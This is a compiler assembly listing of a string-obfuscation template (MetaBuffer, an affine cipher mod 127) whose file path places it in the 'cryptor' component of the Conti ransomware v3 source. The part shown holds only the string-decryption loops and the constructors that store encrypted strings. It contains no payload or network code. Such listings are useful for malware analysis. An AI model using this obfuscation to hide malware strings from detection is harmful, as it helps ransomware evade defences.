; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0FD@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<83,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 10 00 00
	00		 mov	 r10d, 16
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 1b 00 00 00	 mov	 eax, 27
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 1a	 imul	 ecx, eax, 26

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<83,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FD@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0FD@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<83,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<83,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 23	 mov	 BYTE PTR [rcx+1], 35	; 00000023H
  00007	c6 41 02 1b	 mov	 BYTE PTR [rcx+2], 27
  0000b	c6 41 03 0d	 mov	 BYTE PTR [rcx+3], 13
  0000f	c6 41 04 1b	 mov	 BYTE PTR [rcx+4], 27
  00013	c6 41 05 5b	 mov	 BYTE PTR [rcx+5], 91	; 0000005bH
  00017	c6 41 06 1b	 mov	 BYTE PTR [rcx+6], 27
  0001b	c6 41 07 39	 mov	 BYTE PTR [rcx+7], 57	; 00000039H
  0001f	c6 41 08 1b	 mov	 BYTE PTR [rcx+8], 27
  00023	c6 41 09 65	 mov	 BYTE PTR [rcx+9], 101	; 00000065H
  00027	c6 41 0a 1b	 mov	 BYTE PTR [rcx+10], 27
  0002b	c6 41 0b 6a	 mov	 BYTE PTR [rcx+11], 106	; 0000006aH
  0002f	c6 41 0c 1b	 mov	 BYTE PTR [rcx+12], 27
  00033	c6 41 0d 21	 mov	 BYTE PTR [rcx+13], 33	; 00000021H
  00037	c6 41 0e 1b	 mov	 BYTE PTR [rcx+14], 27
  0003b	c6 41 0f 1b	 mov	 BYTE PTR [rcx+15], 27
  0003f	c6 41 10 1b	 mov	 BYTE PTR [rcx+16], 27
  00043	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00047	48 8b c1	 mov	 rax, rcx
  0004a	c3		 ret	 0
??0?$MetaBuffer@$0FD@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<83,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<83,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DF@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<53,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 6c		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 66	 sub	 ecx, 102		; 00000066H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00034	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00038	41 f7 e8	 imul	 r8d
  0003b	41 03 d0	 add	 edx, r8d
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	44 2b c0	 sub	 r8d, eax
  0004e	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00053	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00057	41 f7 e8	 imul	 r8d
  0005a	41 03 d0	 add	 edx, r8d
  0005d	c1 fa 06	 sar	 edx, 6
  00060	8b c2		 mov	 eax, edx
  00062	c1 e8 1f	 shr	 eax, 31
  00065	03 d0		 add	 edx, eax
  00067	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0006a	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006d	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00071	49 83 eb 01	 sub	 r11, 1
  00075	75 a9		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00077	49 8b c1	 mov	 rax, r9
  0007a	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<53,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DF@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DF@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<53,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<53,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 00	 mov	 BYTE PTR [rcx+1], 0
  00007	c6 41 02 66	 mov	 BYTE PTR [rcx+2], 102	; 00000066H
  0000b	c6 41 03 5a	 mov	 BYTE PTR [rcx+3], 90	; 0000005aH
  0000f	c6 41 04 66	 mov	 BYTE PTR [rcx+4], 102	; 00000066H
  00013	c6 41 05 5a	 mov	 BYTE PTR [rcx+5], 90	; 0000005aH
  00017	c6 41 06 66	 mov	 BYTE PTR [rcx+6], 102	; 00000066H
  0001b	c6 41 07 1b	 mov	 BYTE PTR [rcx+7], 27
  0001f	c6 41 08 66	 mov	 BYTE PTR [rcx+8], 102	; 00000066H
  00023	c6 41 09 66	 mov	 BYTE PTR [rcx+9], 102	; 00000066H
  00027	c6 41 0a 66	 mov	 BYTE PTR [rcx+10], 102	; 00000066H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0DF@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<53,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<53,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BB@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 25	 sub	 ecx, 37			; 00000025H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BB@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 39	 mov	 BYTE PTR [rcx+1], 57	; 00000039H
  00007	c6 41 02 25	 mov	 BYTE PTR [rcx+2], 37	; 00000025H
  0000b	c6 41 03 02	 mov	 BYTE PTR [rcx+3], 2
  0000f	c6 41 04 25	 mov	 BYTE PTR [rcx+4], 37	; 00000025H
  00013	c6 41 05 56	 mov	 BYTE PTR [rcx+5], 86	; 00000056H
  00017	c6 41 06 25	 mov	 BYTE PTR [rcx+6], 37	; 00000025H
  0001b	c6 41 07 78	 mov	 BYTE PTR [rcx+7], 120	; 00000078H
  0001f	c6 41 08 25	 mov	 BYTE PTR [rcx+8], 37	; 00000025H
  00023	c6 41 09 25	 mov	 BYTE PTR [rcx+9], 37	; 00000025H
  00027	c6 41 0a 25	 mov	 BYTE PTR [rcx+10], 37	; 00000025H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BB@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EH@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<71,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 2a	 sub	 ecx, 42			; 0000002aH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 22	 imul	 r8d, ecx, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<71,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EH@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EH@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<71,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<71,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 06	 mov	 BYTE PTR [rcx+1], 6
  00007	c6 41 02 2a	 mov	 BYTE PTR [rcx+2], 42	; 0000002aH
  0000b	c6 41 03 22	 mov	 BYTE PTR [rcx+3], 34	; 00000022H
  0000f	c6 41 04 2a	 mov	 BYTE PTR [rcx+4], 42	; 0000002aH
  00013	c6 41 05 7c	 mov	 BYTE PTR [rcx+5], 124	; 0000007cH
  00017	c6 41 06 2a	 mov	 BYTE PTR [rcx+6], 42	; 0000002aH
  0001b	c6 41 07 1e	 mov	 BYTE PTR [rcx+7], 30
  0001f	c6 41 08 2a	 mov	 BYTE PTR [rcx+8], 42	; 0000002aH
  00023	c6 41 09 2a	 mov	 BYTE PTR [rcx+9], 42	; 0000002aH
  00027	c6 41 0a 2a	 mov	 BYTE PTR [rcx+10], 42	; 0000002aH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0EH@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<71,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<71,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$01$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 4b 00 00 00	 mov	 eax, 75			; 0000004bH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
